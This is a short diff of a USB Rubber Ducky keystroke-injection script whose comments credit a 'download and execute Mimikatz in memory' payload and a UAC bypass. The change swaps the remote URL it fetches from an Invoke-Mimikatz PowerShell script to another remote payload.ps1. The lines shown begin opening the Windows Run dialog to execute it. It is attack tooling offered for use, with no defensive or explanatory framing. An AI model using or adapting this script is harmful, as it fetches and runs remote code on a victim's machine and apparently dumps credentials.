@@ -5,7 +5,7 @@ REM Author: Carl Pearce
 REM Based on the Download and execute Mimikatz in memory by Charles Worrell
 REM Based on UAC bypass by Darren Kitchen
 REM **************************************************
-DEFINE URL https://raw.githubusercontent.com/binarycanary/usb-rubber-ducky--mimikatz-in-mem/master/Invoke-Mimikatz.ps1
+DEFINE URL https://raw.githubusercontent.com/ccarlpearce/DuckyScripts/refs/heads/main/RemoteDeploys/payload.ps1
 DELAY 1000
 GUI r
 DELAY 3000
